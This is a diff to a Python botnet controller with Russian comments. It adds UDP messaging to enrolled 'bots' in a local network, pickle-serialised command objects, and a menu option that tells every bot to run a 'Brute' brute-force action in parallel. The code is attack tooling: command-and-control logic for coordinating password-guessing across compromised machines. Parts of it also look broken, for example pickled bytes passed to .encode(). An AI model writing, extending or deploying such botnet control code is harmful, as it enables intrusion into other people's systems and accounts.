@@ -5,16 +5,18 @@ import socket
 # import keyboard
 import threading
 import Brute
+import pickle
+
 
 class Network:
     def __init__(self):
         self.host = socket.gethostname()
         self.ip = socket.gethostbyname(self.host)
         self.port = "8080"
-        self.OS = platform.system() #Операционная система
-        self.addr = []    #Все адреса в локальной сети
-        self.bots = []    #Список ботов в ботнете
-        self.server = ""  #Для клиента ip сервера
+        self.OS = platform.system()  # Операционная система
+        self.addr = []  # Все адреса в локальной сети
+        self.bots = []  # Список ботов в ботнете
+        self.server = ""  # Для клиента ip сервера
 
     def FindDevices(self):
         if self.OS == "Windows":
@@ -37,6 +39,12 @@ class Network:
             dest_address = (i, 8080)
             udp.sendto(message.encode('utf-8'), dest_address)
 
+    def SendBot(self, bot, data):
+        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        dest_address = (bot, 8080)
+        udp.sendto(data.encode('utf-8'), dest_address)
+
     def GetAcceptBot(self):
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
         server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
@@ -53,7 +61,7 @@ class Network:
                 print("Таймаут - больше нет сообщений")
                 break
 
-    def Info(self):
+    def __Info(self):
         return "#########Choice#########\n" \
                "#(1)   CHECK IN LAN (1)#\n" \
                "#(2)Find BOTS IN LAN(2)#\n" \
@@ -62,9 +70,26 @@ class Network:
                "#(e)     EXIT       (e)#\n" \
                "#########Choice#########\n"
 
+    def __ActionInfo(self):
+        return "#########Choice#########\n" \
+               "#(b) BruteForce     (b)#\n" \
+               "#(e)     Back       (e)#\n" \
+               "#########Choice#########\n"
+
+    def CreateAction(self, id, action, array=None):
+        data = {"Id": id, "Action": action}
+        if array is not None:
+            data["Array"] = array
+        return pickle.dumps(data)
+
+    def StartParallels(self, action, array=None):
+        for i, bot in (enumerate(self.bots)):
+            data = self.CreateAction(i, action, array)
+            self.SendBot(bot=bot, data=data)
+
     def StartServer(self):
         while True:
-            print(self.Info())
+            print(self.__Info())
             x = str(input())
             match x:
                 case "1":
@@ -75,9 +100,18 @@ class Network:
                     accept_threading.start()
                     validate_threading.start()
                 case "3":
-                    print(1)
+                    if len(self.bots) > 0:
+                        print(self.__ActionInfo())
+                        x = str(input())
+                        match x:
+                            case "b":
+                                self.StartParallels(action="Brute")
+                            case _:
+                                print("This action not found!")
+                    else:
+                        print("You have 0 bots in botnet")
                 case "p":
-                    print("Bots in botnet:")
+                    print(f"Bots in botnet: {len(self.bots)}")
                     print(self.bots)
                 case "e":
                     exit(4)
@@ -102,7 +136,6 @@ class Network:
         # получаем сообщения
         while True:
             try:
-                message = "True"
                 data, addr = server_socket.recvfrom(1024)  # получаем сообщение и адрес отправителя
                 self.server = addr[0]
                 print("Получено сообщение от {0}: {1}".format(addr, data.decode('utf-8')))  # выводим данные
